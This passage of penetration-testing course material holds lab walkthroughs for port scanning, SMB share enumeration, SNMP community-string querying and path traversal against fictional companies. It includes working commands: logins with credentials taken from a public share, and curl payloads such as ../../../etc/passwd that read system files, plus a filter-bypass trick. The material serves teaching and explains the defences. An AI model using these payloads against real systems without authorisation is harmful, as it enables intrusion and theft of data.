Two of the four services; FTP and the custom service on port 8888; were unknown to the system administrator. Unauthorized or forgotten services are among the most common findings in real penetration tests.

Flag Format

Assemble the flag using the tokens in the order you discovered them:

OCR{________}

Where http is the token from the HTTP page source (Step 4), ftp is the token from the FTP file (Step 5), and banner is the token from the port 8888 banner (Step 6).

docs.title: Step 8: Find and Submit the Flag
docs.text:
You have now collected three tokens: one from the HTTP page source, one from the FTP server, and one from the port 8888 banner. Combine the three tokens to form the complete flag in OCR{...} format.

Paste the assembled flag into the Submit Flag form on the platform and click Submit. A green confirmation message indicates a correct submission.

docs.title: Analysis Questions
docs.text:
Consider these questions carefully. They reinforce the concepts from the lab and prepare you for more advanced scanning techniques.

1. Jake believed only SSH and a web server were running. Why is it dangerous to rely on assumptions instead of scanning?

Reveal Answer

Services can be installed and started without the administrator's knowledge; by automated scripts, package dependencies, or other team members. A port scan provides objective evidence of what is actually listening on the network. Relying on memory or documentation alone leaves blind spots that attackers will find.

2. The FTP server allowed anonymous login. Why is anonymous FTP access a security concern, even if the files seem harmless?

Reveal Answer

Anonymous FTP means anyone on the network can connect and browse files without authentication. Even if the current files appear harmless, the server could be used to host malicious content, leak sensitive data added later, or serve as a pivot point for further attacks. The lack of authentication also means there is no audit trail connecting downloads to a specific user.

3. Why did scanning only the default 1,000 ports risk missing the service on port 8888?

Reveal Answer

Nmap's default port list contains the 1,000 most commonly used port numbers, and port 8888 is not among them. Services running on non-standard or high-numbered ports are invisible to a default scan. Expanding the port range; or scanning all 65,535 ports; ensures that no listening service goes undetected, though the scan takes longer to complete.

docs.title: Key Takeaways
docs.text:
• Port scanning reveals which services a machine exposes to the network, and scanning beyond the default 1,000 ports is necessary to find services on non-standard ports
  • Service version detection (-sV) confirms what software is actually running on each port, replacing guesses with verified information
  • Anonymous FTP access is a common misconfiguration that allows anyone to connect and browse files without credentials; a finding worth reporting in any assessment
  • Banner grabbing with netcat (nc) lets you read the initial message from any TCP service, including custom or unidentified applications
  • Enumeration: the process of scanning and interacting with services; is the foundation of every penetration test and the skill you will build on throughout this course. Week 2 expands on these techniques with targeted service analysis

docs.title: Before You Begin
docs.text: In Week 1, you learned how to connect to the lab environment, run basic scans, and navigate the platform interface. Those foundational skills; launching a lab, reading an IP address from the Active Lab View, and using the terminal; carry directly into every lab going forward. Make sure your VPN connection is active and that you can reach the lab network before proceeding.

docs.title: Scenario
docs.text:
Blackwell & Associates is a mid-size law firm in Richmond, Virginia. The firm recently migrated its internal file server to a new Linux-based system running Samba, and the IT contractor who configured the server assured the managing partner that "everything is properly locked down."

Your firm has been hired to verify that claim. Victoria Blackwell, the managing partner, wants to know whether someone from outside the network can access confidential case files. Client confidentiality is the foundation of her practice, and any exposure would be a serious finding.

The scope of your assessment covers the file server and all exposed SMB (Server Message Block) shares. Two assessment tokens have been placed on the server; one on a public share and one on a restricted share. Your job is to enumerate the shares, discover any exposed information, and retrieve both tokens.

docs.title: Your Objectives
docs.text:
The following list outlines what you need to accomplish during the assessment. Each objective maps to one or more steps in the walkthrough below.

  • Use SMB enumeration tools to discover available network shares
  • Access a public share and identify sensitive information
  • Discover credentials through information disclosure on the public share
  • Use the discovered credentials to access a restricted share
  • Retrieve the flag from the restricted share and submit it

docs.title: Background: SMB and Samba
docs.text:
SMB (Server Message Block) is a network protocol that allows computers to share files, printers, and other resources over a network. Windows systems have used SMB natively for decades. On Linux systems, a software package called Samba implements the SMB protocol, allowing Linux servers to act as file servers for Windows clients; or for anyone who speaks the SMB protocol.

An SMB server organizes files into shares. Each share is a named folder that the server exposes to the network. Some shares allow anonymous access, meaning anyone can connect without providing a username or password. Other shares require authenticated access, meaning the server checks a username and password before granting entry. Misconfigured servers sometimes expose shares anonymously when they should require credentials, or they leave sensitive data on public shares that was never intended for outside eyes.

Enumeration is the process of discovering what shares exist, which ones allow anonymous access, and what files live on each share. A penetration tester starts by listing all available shares, connects to any that allow anonymous access, reviews the files for sensitive information (such as credentials or internal documents), and then uses any discovered credentials to access restricted shares. The diagram below illustrates that workflow.

graph TD
    A["Scan for SMB<br/>port 445"] --> B["List available<br/>shares"]
    B --> C{"Anonymous<br/>access?"}
    C -->|"Yes"| D["Browse public<br/>share files"]
    C -->|"No"| E["Credentials<br/>required"]
    D --> F["Find credentials<br/>in files"]
    F --> G["Authenticate to<br/>restricted share"]
    E --> G
    G --> H["Retrieve flag"]

    style A fill:#4a90d9,color:#fff
    style B fill:#4a90d9,color:#fff
    style C fill:#e8a735,color:#fff
    style D fill:#6aaa64,color:#fff
    style E fill:#d9534f,color:#fff
    style F fill:#6aaa64,color:#fff
    style G fill:#4a90d9,color:#fff
    style H fill:#6aaa64,color:#fff

docs.title: Tool Primer: smbclient and enum4linux
docs.text: Two tools handle the majority of SMB enumeration work on Linux. You will use both in the walkthrough, so take a moment to understand their syntax and purpose before diving in.

docs.title: smbclient
docs.text:
The smbclient tool works like an FTP client for SMB shares. You can list available shares on a server, connect to a specific share, browse directories, and download files.

List all shares on a server (anonymous)

The command below queries the server for every share it exposes, without supplying credentials. You will run the live version in the walkthrough.

smbclient -L //<target_ip> -N
Flag Purpose -L List mode; show all shares on the target server //<target_ip> The IP address of the SMB server, prefixed with // -N No password; connect anonymously without a password prompt

Sample output:

Sharename       Type      Comment
---------       ----      -------
general         Disk      General company information
hr_data         Disk      HR department files
IPC$            IPC       IPC Service

Each row shows a share name, its type (Disk means a file share, IPC means inter-process communication), and an optional comment describing the share.

Connect to a specific share (anonymous)

The command below opens an interactive session against a named share without credentials.

smbclient //<target_ip>/general -N

Once connected, the prompt changes to smb: \>. From there, use ls to list files, get <filename> to download a file, and exit to disconnect.

Connect to a share with credentials

Supply a username and password in user%password format to open a share that requires authentication.

smbclient //<target_ip>/hr_data -U hr_svc%Bl4ckw3ll_HR#
Flag Purpose -U Specify a username and password in user%password format

docs.title: enum4linux
docs.text:
The enum4linux tool automates several SMB enumeration tasks at once. Running a single command can reveal share names, usernames, group memberships, and password policies; all without needing to authenticate.

Basic share enumeration with enum4linux

The command below automates share discovery and reports the anonymous access level for each share in one pass.

enum4linux -S <target_ip>
Flag Purpose -S Enumerate shares on the target

Sample output:

 =============================
|    Share Enumeration on <target_ip>    |
 =============================

        Sharename       Type      Comment
        ---------       ----      -------
        general         Disk      General company information
        hr_data         Disk      HR department files
        IPC$            IPC       IPC Service

[+] Mapping: general - Mapping: OK, Listing: OK
[+] Mapping: hr_data - Mapping: DENIED, Listing: DENIED

The "Mapping" and "Listing" lines at the bottom reveal access permissions. "OK" means anonymous access is allowed. "DENIED" means credentials are required. The enum4linux tool saves you the step of testing each share individually; it reports which shares are open and which are locked.

docs.title: Step 1: Launch the Exercise
docs.text:
Open the platform in your browser and start the exercise environment. The lab takes about one minute to fully initialize.

  • Navigate to Exercises and select the Weekly Challenges track
  • Click Launch on "SMB Share Enumeration"
  • Wait for the status indicator to change to Running
  • Note the target IP displayed in the Active Lab View; you will use it in every command below

docs.title: Step 2: Verify SMB Is Running
docs.text:
Confirm the SMB port is open

Before attempting any enumeration, confirm that the target server is listening on the SMB port. Port 445 is the standard port for SMB traffic on modern systems.

nmap -p 445 <target_ip>

You should see output similar to:

PORT    STATE SERVICE
445/tcp open  microsoft-ds

The open state confirms that the Samba service is running and accepting connections. If the port shows as closed or filtered, wait 30 seconds for the lab environment to finish starting and run the scan again.

docs.title: Step 3: Enumerate Shares
docs.text:
Now that you know SMB is running, discover what shares the server exposes. Run both tools to see how each presents the information.

Enumerate shares with smbclient

List every share the server exposes, anonymously.

smbclient -L //<target_ip> -N

Enumerate shares with enum4linux

Run the automated enumerator to also see which shares allow anonymous access.

enum4linux -S <target_ip>

Both commands should reveal at least two file shares: general and hr_data. The enum4linux output goes a step further by testing whether each share allows anonymous access. Look for "Mapping: OK" next to the general share and "Mapping: DENIED" next to hr_data. The general share is your starting point.

docs.title: Step 4: Access the Public Share and Find Credentials
docs.text:
Browse the public share and download the notes

The general share allows anonymous access, so connect to it without providing a password. Browsing public shares for sensitive information is a core enumeration technique.

smbclient //<target_ip>/general -N

Once you see the smb: \> prompt, list the files:

smb: \> ls

You should see a file called onboarding_notes.txt in the listing. Download it:

smb: \> get onboarding_notes.txt

Exit the SMB session:

smb: \> exit

Read the downloaded notes

Now read the file on your local machine.

cat onboarding_notes.txt

Look through the contents carefully. The onboarding notes contain a service account username and password intended for the HR department. The credentials are:

  • Username: hr_svc
  • Password: Bl4ckw3ll_HR#

These credentials were left in a file on a publicly accessible share; a classic example of information disclosure. Anyone who connects to the general share can read them.

docs.title: Step 5: Confirm the Discovered Credentials
docs.text:
Validate the discovered credentials

Before trying to access the restricted share, verify that the credentials you found are valid. Testing against a known share reduces confusion if something goes wrong later.

smbclient //<target_ip>/IPC$ -U hr_svc%Bl4ckw3ll_HR# -c 'exit'

The -c 'exit' flag tells smbclient to connect, run the exit command, and disconnect immediately. If the command completes without an error, the credentials are valid. If you see NT_STATUS_LOGON_FAILURE, double-check the username and password for typos.

docs.title: Step 6: Access the Restricted Share
docs.text:
Access the restricted share and download the token

With confirmed credentials, connect to the hr_data share that was previously denied to anonymous users.

smbclient //<target_ip>/hr_data -U hr_svc%Bl4ckw3ll_HR#

You should see the smb: \> prompt, confirming authenticated access. List the files:

smb: \> ls

Look for a file that contains the assessment token. Download it:

smb: \> get assessment_token.txt

Exit the session:

smb: \> exit

docs.title: Step 7: Extract the Flag
docs.text:
Read the downloaded token file

Read the downloaded token file on your local machine to retrieve the flag.

cat assessment_token.txt

The flag is in OCR{...} format. Copy the entire flag string, including the OCR{ prefix and the closing }.

docs.title: Record Your Findings
docs.text:
Nmap scan output (port 445):

(paste your nmap output here)

Shares discovered:

Share Name Anonymous Access?

Contents of onboarding_notes.txt:

(paste the relevant section here)

Credentials found:

Username Password

Flag:

(paste the flag here)

docs.title: Step 8: Interpret the Results
docs.text:
Take a moment to review what you accomplished and what each finding means for the client.

The general share allowed anonymous access. Anyone on the network; or anyone who can reach port 445; can connect and browse its contents without any credentials. On its own, a public share is not always a vulnerability. Some organizations intentionally share non-sensitive documents. The problem here is that the general share contained credentials for a privileged account.

The onboarding_notes.txt file disclosed the hr_svc service account credentials in plain text. Storing passwords in shared files is a common misconfiguration, especially when IT teams create "quick reference" documents during server setup and forget to remove them afterward.

The hr_data share required authentication, which means the server was partially configured correctly. However, the credentials on the public share completely undermined that protection. An attacker who enumerated the general share would gain access to hr_data within minutes; exactly as you did.

Flag Format

Assemble the flag using the tokens in the order you discovered them:

OCR{________}

Where public is the token from the public share (Step 4), and restricted is the token from the restricted share (Step 6).

docs.title: Step 9: Submit the Flag
docs.text: Navigate to the lab page on the platform. Paste the OCR{...} flag value into the Submit Flag field and click Submit. The platform will confirm whether the flag is correct.

docs.title: Analysis Questions
docs.text:
These questions reinforce the concepts from the walkthrough. Think through each one before reading the answer.

1. The hr_data share required authentication, but you still accessed it. What was the root cause of the exposure; the share permissions or the information disclosure?

Reveal Answer

The root cause was the information disclosure. The hr_data share permissions were configured correctly; anonymous users could not access it. The breakdown occurred because valid credentials were stored in plain text on a share that allowed anonymous access. Fixing the share permissions on hr_data alone would not have solved the problem. The credentials needed to be removed from the general share (or the general share needed authentication as well).

2. Why is enum4linux useful even though smbclient can also list shares?

Reveal Answer

The enum4linux tool tests each share for anonymous access automatically. With smbclient -L, you get a list of share names, but you do not know which ones allow anonymous connections until you try each one manually. The enum4linux tool saves time by reporting the access level for every share in a single command. On a server with dozens of shares, that difference matters.

3. The credentials used the format hr_svc / Bl4ckw3ll_HR#; a service account with a company-themed password. Why are service account credentials particularly dangerous when exposed?

Reveal Answer

Service accounts often have broader access than individual user accounts because they are designed to run automated processes across multiple systems. They also tend to have passwords that rarely change, since changing them could break the services that depend on them. An attacker with service account credentials may be able to access multiple shares, databases, or systems; not a single user's files. The combination of broad access and infrequent password rotation makes service account exposure a high-severity finding.

docs.title: Key Takeaways
docs.text:
• SMB enumeration starts with discovering shares (smbclient -L or enum4linux -S) and identifying which ones allow anonymous access; always check before attempting authentication
  • Information disclosure on public shares is one of the most common ways attackers discover credentials in real assessments; files like onboarding guides, setup notes, and configuration backups frequently contain passwords
  • Service accounts with static, company-themed passwords represent a high-risk finding because they typically have broad access and rarely rotate credentials
  • Layered access controls only work if every layer holds; a locked share is meaningless when the key is sitting on a public share next door
  • Week 3 builds on these skills by introducing credential brute-forcing, where you will test multiple username and password combinations automatically instead of relying on manually discovered credentials

docs.title: Before You Begin
docs.text: Weeks 1 and 2 covered TCP-based port scanning and service enumeration using Nmap. Those scans rely on the TCP handshake to detect open ports; but not every network service uses TCP. Some critical management protocols run over UDP (User Datagram Protocol), which means a standard Nmap scan will miss them entirely. Your VPN must be connected and your terminal open before proceeding.

docs.title: Scenario
docs.text:
Greystone Manufacturing operates a production facility in Pittsburgh, Pennsylvania. Their operational technology (OT) team recently deployed a network monitoring gateway to track equipment status across the factory floor. The gateway runs SNMP (Simple Network Management Protocol) for network management.

Karl Weber, the OT Security Lead, is skeptical about the assessment: "SNMP is for monitoring; there is nothing sensitive there. We use the standard community string. The gateway sits on an internal network anyway."

Your job is to prove otherwise. The SNMP service may expose more system information than Karl expects. Three assessment tokens have been embedded in the SNMP MIB (Management Information Base) data. Extract all three tokens using SNMP enumeration tools, combine them into the flag, and submit it.

docs.title: Your Objectives
docs.text:
• Discover the SNMP service on the target using a UDP port scan
  • Enumerate system information using the default community string
  • Query specific OIDs (Object Identifiers) to extract embedded tokens from sysDescr, sysLocation, and sysContact
  • Perform a full SNMP walk to observe all available data
  • Combine the three tokens into the flag and submit it

docs.title: Background: SNMP and Community Strings
docs.text:
SNMP (Simple Network Management Protocol) is a protocol used to monitor and manage network devices; routers, switches, servers, printers, and industrial control systems. Network administrators rely on SNMP to collect information such as CPU load, interface status, system uptime, and configuration details. SNMP operates over UDP port 161, which is why standard TCP scans do not detect it.

Every SNMP-enabled device organizes its data in a tree structure called a MIB (Management Information Base). Each piece of data in the MIB tree has a unique address called an OID (Object Identifier), written as a dotted series of numbers. For example, the OID 1.3.6.1.2.1.1.1.0 points to sysDescr, which contains a text description of the device. Other common OIDs include sysLocation (1.3.6.1.2.1.1.6.0), which stores the device's physical location, and sysContact (1.3.6.1.2.1.1.4.0), which stores the administrator's contact information.

Access control in SNMPv1 and SNMPv2c relies on community strings: plain-text passwords sent with every request. The default read-only community string on most devices is public. Many administrators never change the default, which means anyone on the network can query the device for its full MIB tree. Attackers use default community strings to harvest system details, network topology, and sometimes credentials or configuration data without any authentication.

graph LR
    A["SNMP Manager<br/>(your machine)"] -->|"GetRequest<br/>community: public"| B["SNMP Agent<br/>(target device)"]
    B -->|"GetResponse<br/>sysDescr value"| A
    B --- C["MIB Tree<br/>OID: 1.3.6.1.2.1..."]

    style A fill:#4a90d9,color:#fff
    style B fill:#6aaa64,color:#fff
    style C fill:#e8a735,color:#fff

The diagram above shows the basic SNMP request-response flow. Your machine sends a GetRequest with the community string public, and the agent on the target device replies with the requested data from its MIB tree.

docs.title: Tool Primer: snmpwalk
docs.text:
snmpwalk: query the MIB tree

The snmpwalk command queries an SNMP agent and retrieves data from its MIB tree. The tool "walks" through the tree starting at a given OID and returns every value beneath it. Below is the basic syntax you will use in the lab.

snmpwalk -v2c -c public <target_ip> <OID>

Each flag serves a specific purpose:

  • -v2c: use SNMP version 2c (the most common version on older and OT devices)
  • -c public: set the community string to public
  • <target_ip>: the IP address of the target device
  • <OID>: the starting point in the MIB tree (omit to walk the entire tree)

Sample output when querying sysDescr:

SNMPv2-MIB::sysDescr.0 = STRING: Greystone ICS Gateway v2.4; Token: <redacted>

The output shows the OID name on the left (sysDescr.0) and the value on the right. The STRING: prefix indicates the data type. When you see Token: followed by a value, that value is one of the three tokens you need to extract.

docs.title: Step 1: Launch the Exercise
docs.text:
Open the platform in your browser and start the exercise environment. The target containers must be running before any scan will return results.

  • Navigate to Exercises and locate the Week 3 challenge: Greystone Manufacturing; SNMP Community Strings
  • Click Launch and wait for the status to change to Running
  • Note the target IP displayed in the Active Lab View

docs.title: Step 2: Discover SNMP with a UDP Scan
docs.text:
Scan UDP port 161 for SNMP

Standard Nmap scans use TCP and will not detect SNMP because the protocol runs on UDP port 161. You need to run a UDP scan with the -sU flag to find it.

nmap -sU -p 161 <target_ip>

Replace <target_ip> with the IP shown in the Active Lab View. UDP scans are slower than TCP scans because UDP has no handshake; Nmap must wait for a response or a timeout for each probe. Targeting a single port (-p 161) keeps the scan fast.

Expected output:

PORT    STATE SERVICE
161/udp open  snmp

The result confirms that SNMP is listening on UDP port 161. A state of open means the port responded to the probe. If you see open|filtered, the port may still be accessible; proceed with snmpwalk to confirm.

docs.title: Step 3: Query sysDescr and Extract Token 1
docs.text:
Query sysDescr for token 1

The sysDescr OID (1.3.6.1.2.1.1.1.0) contains a text description of the device. Query it using snmpwalk with the public community string.

snmpwalk -v2c -c public <target_ip> 1.3.6.1.2.1.1.1.0

The output will include a description of the Greystone ICS Gateway along with an embedded token. Look for the text following Token: in the response. Write down the token value; you will need it later to assemble the complete flag.

docs.title: Step 4: Query sysLocation and Extract Token 2
docs.text:
Query sysLocation for token 2

The sysLocation OID (1.3.6.1.2.1.1.6.0) stores the physical location of the device. Query it with the same community string.

snmpwalk -v2c -c public <target_ip> 1.3.6.1.2.1.1.6.0

The response will include location information about the Greystone facility and a second embedded token after Token:. Record the token value alongside your first token.

docs.title: Step 5: Query sysContact and Extract Token 3
docs.text:
Query sysContact for token 3

The sysContact OID (1.3.6.1.2.1.1.4.0) holds the administrator's contact information. Query it the same way.

snmpwalk -v2c -c public <target_ip> 1.3.6.1.2.1.1.4.0

The output will contain contact details and a third token after Token:. You now have all three tokens needed to build the flag.

docs.title: Step 6: Perform a Full SNMP Walk
docs.text:
Walk the full system subtree

Now that you have extracted the three tokens, run a full walk of the system subtree to see what else the SNMP agent exposes. Understanding the full scope of SNMP exposure is a key assessment skill.

snmpwalk -v2c -c public <target_ip> system

The system keyword tells snmpwalk to start at the top of the system MIB group and walk through every OID beneath it. Scroll through the output and observe the types of information available; system uptime, hostname, object IDs, and more. On a production device, a full walk might reveal network interface details, routing tables, or software versions that an attacker could use to plan further attacks.

docs.title: Record Your Findings
docs.text:
Record the output from each SNMP query below. Capturing raw output builds the habit of documenting evidence during a real assessment.

UDP scan output:

(paste your nmap -sU output here)

sysDescr query output:

(paste your snmpwalk sysDescr output here)

sysLocation query output:

(paste your snmpwalk sysLocation output here)

sysContact query output:

(paste your snmpwalk sysContact output here)

Tokens extracted:

OID Token Value sysDescr sysLocation sysContact

docs.title: Step 7: Interpret the Results
docs.text:
Review the data you collected from each SNMP query and consider what it reveals about the target.

  • sysDescr disclosed the device type, firmware version, and a descriptive label. An attacker could use version information to search for known vulnerabilities affecting that specific firmware
  • sysLocation revealed the physical location of the device. Physical location data helps an attacker map out the facility and identify high-value areas on the factory floor
  • sysContact exposed administrator contact details. Contact information can feed social engineering attacks; an attacker could impersonate IT staff or reference specific personnel names to build credibility

Karl assumed SNMP was harmless because the gateway sits on an internal network. The data you extracted demonstrates that even "monitoring-only" protocols can leak operationally sensitive information when protected by default community strings.

Flag Format

Assemble the flag using the tokens in the order you discovered them:

OCR{________}

Where sysDescr is the token from the sysDescr query (Step 3), sysLocation is the token from the sysLocation query (Step 4), and sysContact is the token from the sysContact query (Step 5).

docs.title: Step 8: Submit the Flag
docs.text: Combine all three tokens into the flag format. The flag follows the pattern OCR{...} where the three token values are joined with underscores. Paste the assembled flag into the Submit Flag form on the platform and click Submit.

docs.title: Analysis Questions
docs.text:
Consider the following questions based on what you observed during the lab. Each question is followed by an answer you can use to check your reasoning.

1. Why did a standard Nmap scan (without the -sU flag) fail to detect SNMP on the target?

Reveal Answer

SNMP runs on UDP port 161, not TCP. A default Nmap scan sends TCP SYN packets, which only detect TCP-based services. UDP services require the -sU flag because UDP has no handshake; Nmap must send a UDP probe and wait for either a response or a timeout. Without -sU, SNMP is invisible to the scan.

2. The community string "public" gave you read access to the entire MIB tree. What could an attacker do if the community string provided write access?

Reveal Answer

Write access through a community string like private would allow an attacker to modify device configuration remotely; changing the system location, disabling interfaces, altering routing tables, or even loading new firmware. On an OT gateway, write access could disrupt manufacturing processes or disable safety monitoring systems.

3. Karl argued that SNMP is safe because the gateway is on an internal network. What is the flaw in that reasoning?

Reveal Answer

Internal networks are not inherently safe. An attacker who gains access through phishing, a compromised workstation, or a misconfigured firewall rule can pivot into the internal network and query SNMP services. Defense in depth requires securing services regardless of network location; change default community strings, restrict SNMP access to specific management stations, and upgrade to SNMPv3 with authentication and encryption.

docs.title: Key Takeaways
docs.text:
• UDP scanning requires the -sU flag in Nmap; standard TCP scans will miss protocols like SNMP, DNS, and TFTP that run exclusively over UDP
  • SNMP community strings function as plain-text passwords, and the default value public is left unchanged on a large number of production devices
  • MIB trees organize device data into a hierarchical structure addressable by OIDs, exposing system descriptions, locations, contact details, network interfaces, and more
  • Default configurations are a recurring vulnerability; the security of a protocol depends on how it is configured, not on the protocol's intended purpose
  • Week 4 builds on these enumeration skills by introducing new protocols and deeper service interrogation techniques

docs.title: Before You Begin
docs.text: Weeks 1 through 3 focused on network-level enumeration; scanning ports, identifying services, and probing protocols like SMB (Server Message Block). Week 4 shifts focus from the network layer to the application layer, where vulnerabilities live inside the logic of web applications rather than in open ports. Your VPN must be connected and your terminal open before continuing.

docs.title: Scenario
docs.text:
Pinnacle Cloud Services runs a customer documentation portal where clients can download product guides, API references, and release notes. The portal was built quickly by a junior developer and went live without a security review.

Marcus Reed (Engineering Manager) authorized the assessment: "The portal is simple; serves static files. I cannot imagine there is much risk there. But our compliance team wants a sign-off before the SOC 2 audit."

Your job is to test whether the file download feature can be abused to read files outside the intended directory. Two assessment tokens have been placed on the server; one in the application directory and one that requires full filesystem traversal to reach.

The Pinnacle Cloud documentation portal in normal use. Each document links to a `/download?file=` endpoint, the exact feature you will test for path traversal.

docs.title: Your Objectives
docs.text:
The documentation portal presents a specific attack surface worth investigating. Your goals for the assessment are listed below.

  • Identify a file download feature vulnerable to path traversal
  • Craft directory traversal payloads using ../ sequences
  • Read system files outside the web application root
  • Extract two assessment tokens from the server
  • Assemble and submit the flag in OCR{...} format

docs.title: Background: Path Traversal Attacks
docs.text:
Web applications often serve files by taking a filename from the URL (Uniform Resource Locator) and reading that file from a directory on the server. A download endpoint might receive a request like /download?file=guide.pdf and return the contents of /var/www/app/docs/guide.pdf. The application concatenates a base directory path with the user-supplied filename to locate the file on disk.

Path traversal; also called directory traversal; exploits the way operating systems interpret the ../ sequence. Each ../ moves one directory level upward in the filesystem hierarchy. When a web application fails to validate user input, an attacker can replace the expected filename with a chain of ../ sequences to escape the intended directory and read arbitrary files. For example, requesting /download?file=../../../etc/passwd tells the server to go up three directories from the docs folder and then into /etc/passwd.

Input validation is the primary defense against path traversal. A secure application strips or rejects ../ sequences, uses an allowlist of permitted filenames, or resolves the full path and confirms the result stays within the expected directory. Without these checks, any file readable by the web server process is exposed to the attacker.

graph TD
    A["Browser requests<br/>guide.pdf"] -->|"Normal request"| B["Server reads<br/>/var/www/app/docs/<br/>guide.pdf"]
    B --> C["Returns PDF<br/>to browser"]
    D["Browser requests<br/>../../../etc/passwd"] -->|"Traversal attack"| E["Server reads<br/>/etc/passwd"]
    E --> F["Returns system<br/>file to attacker"]

    style A fill:#4a90d9,color:#fff
    style B fill:#6aaa64,color:#fff
    style C fill:#6aaa64,color:#fff
    style D fill:#d9534f,color:#fff
    style E fill:#d9534f,color:#fff
    style F fill:#d9534f,color:#fff

The diagram above contrasts a normal file download with a traversal attack. The normal path stays within the application's document root, while the traversal path escapes upward through the filesystem to reach sensitive system files.

docs.title: Tool Primer: curl for Web Testing
docs.text:
curl is a command-line tool for transferring data over HTTP (Hypertext Transfer Protocol) and other protocols. Penetration testers use curl to send precise requests to web applications and inspect the raw responses without a browser getting in the way. The tool comes pre-installed on most Linux systems.

Basic GET request with curl

The command below fetches the page at the given URL and prints the HTML (Hypertext Markup Language) response body to the terminal.

curl http://<target>/

Useful flags for web testing:

Flag Purpose -s Silent mode; hides the progress bar -o /dev/null Discards the response body (useful with -w) -w '%{http_code}' Prints the HTTP status code (200, 404, 500, etc.) -v Verbose mode; shows request and response headers -L Follows HTTP redirects automatically

Check whether a page exists

The command below requests a file but prints only the HTTP status code, a fast way to probe for valid paths.

curl -s -o /dev/null -w '%{http_code}' http://<target>/download?file=guide.pdf

A 200 status code means the server found and returned the file. A 404 means the file was not found. A 500 may indicate a server error triggered by unexpected input; which can itself be informative during testing.

docs.title: Step 1: Launch the Exercise
docs.text:
Open the platform in your browser and start the exercise environment. You need a running lab before any web requests will reach the target.

  • Navigate to Exercises and locate the Week 4 challenge
  • Click Launch on "Directory Traversal"
  • Wait for the status to change to Running
  • Note the target IP displayed in the Active Lab View

docs.title: Step 2: Browse the Application and Identify the Download Feature
docs.text:
Fetch the portal home page

Before testing for vulnerabilities, explore the application as a normal user would. Retrieve the documentation portal to understand what features are available.

curl -s http://<target>/

Replace <target> with the IP address shown in the Active Lab View. Read through the HTML output and look for links to downloadable files. The portal should list documents such as product guides and API references, each with a download link.

docs.title: Step 3: Examine the URL Structure of the Download Endpoint
docs.text:
Click one of the download links (or inspect the HTML source) and observe how the application passes the filename to the server. Pay attention to the URL in the address bar or in the href attribute of the download links.

You should see a pattern like:

http://<target>/download?file=guide.pdf

The file parameter tells the server which document to retrieve. The server likely appends the value of file to a base directory path and reads that location from disk. The question is whether the server validates the input before using it.

docs.title: Step 4: Test Basic Traversal with /etc/passwd
docs.text:
Test traversal against /etc/passwd

The /etc/passwd file exists on every Linux system and is world-readable by default, making it the standard first target when testing for path traversal. A successful read confirms the vulnerability exists.

curl -s 'http://<target>/download?file=../../../etc/passwd'

If the application is vulnerable, the response will contain lines resembling:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...

Seeing /etc/passwd content confirms that the file parameter is vulnerable to directory traversal. The ../../../ sequence moved up three levels from the application's document directory and into the system root.

The `/download` endpoint returns `/etc/passwd` when fed a `../../../` payload, proof the document root provides no boundary. Every line of the system password file is readable by the web server process.

docs.title: Step 5: Extract Token from config/token.conf
docs.text:
Read the config token via traversal

The first assessment token is stored in a configuration file one level above the document directory. Retrieve the token by traversing up a single level into the config directory.

curl -s 'http://<target>/download?file=../config/token.conf'

The response should contain a line in the format token=<value>. Record the value after the equals sign; you will need it to assemble the final flag.

docs.title: Step 6: Extract Flag from /root/flag.txt
docs.text:
Read the root flag via deep traversal

The second assessment token requires full filesystem traversal to reach the /root directory. Use a longer ../ chain to traverse from the document directory all the way to the filesystem root.

curl -s 'http://<target>/download?file=../../../root/flag.txt'

Record the value returned. Combined with the token from Step 5, you now have both components needed to assemble the flag.

docs.title: Record Your Findings
docs.text:
Record the output from each step below. Documenting your payloads and responses builds evidence for the assessment report.

curl output for /etc/passwd test:

(paste your output here)

Token from config/token.conf:

Source Value ../config/token.conf

Token from /root/flag.txt:

Source Value ../../../root/flag.txt

Assembled flag:

OCR{...}

docs.title: Step 7: Interpret the Results
docs.text:
Review what you discovered during the assessment. Three findings emerged from the testing.

  • Path traversal confirmed: The /download endpoint accepts ../ sequences without sanitization, allowing access to files outside the document root. Any file readable by the web server process is exposed.
  • System file disclosure: The /etc/passwd file was retrieved, confirming full filesystem traversal. While /etc/passwd itself does not contain passwords on modern Linux systems, its contents reveal usernames, home directories, and shell assignments that aid further attacks.
  • Sensitive data extracted: Both assessment tokens were retrieved from locations outside the intended document directory. In a real engagement, these could be configuration files containing database credentials, API keys, or encryption secrets.

The root cause is missing input validation on the file parameter. The application blindly concatenates user input with a base path and reads the resulting file from disk.

Flag Format

Assemble the flag using the tokens in the order you discovered them:

OCR{<config_token>_<root_token>}

Where <config_token> is the value you extracted from the config directory traversal (Step 5), and <root_token> is the value from the /root filesystem traversal (Step 6).

docs.title: Step 8: Submit the Flag
docs.text: Assemble the two tokens you extracted into the OCR{...} flag format. Navigate to the Submit Flag form on the platform, paste your assembled flag, and click Submit.

docs.title: Analysis Questions
docs.text:
Consider these questions to deepen your understanding of path traversal and web application security. Each answer appears directly below its question.

1. Why is /etc/passwd typically the first file testers request when checking for path traversal?

Reveal Answer

The /etc/passwd file exists on every Linux system and is readable by all users by default. A successful read confirms the vulnerability without requiring elevated privileges. The file also contains useful reconnaissance data such as usernames and home directory paths.

2. An application strips all occurrences of ../ from the input before using it. Can an attacker still achieve path traversal? How?

Reveal Answer

A single-pass strip can be bypassed with a payload like ....//. When the application removes the inner ../, the remaining characters reassemble into ../. Effective defenses resolve the full canonical path after processing and verify the result falls within the allowed directory, rather than relying on string replacement alone.

3. What specific code-level fix would prevent the vulnerability you exploited in the documentation portal?

Reveal Answer

The application should resolve the user-supplied filename to an absolute path (using a function like Python's os.path.realpath()), then check that the resolved path starts with the expected base directory. Requests that resolve outside the base directory should be rejected. An allowlist of permitted filenames provides an even stronger defense.

docs.title: Key Takeaways
docs.text:
• Path traversal exploits the ../ directory sequence to escape a web application's intended file-serving directory and read arbitrary files on the server
  • Input validation is the primary defense; applications must verify that resolved file paths stay within the expected directory before reading from disk
  • System files like /etc/passwd serve as a reliable proof-of-concept for traversal vulnerabilities, confirming the flaw exists before searching for higher-value targets
  • Configuration files often contain credentials, tokens, and secrets that escalate the impact of a traversal vulnerability far beyond reading public system files
  • Week 5 builds on web application testing by introducing more complex attack vectors; the enumeration and traversal skills from the first four weeks form the foundation for those challenges

docs.title: Before You Begin
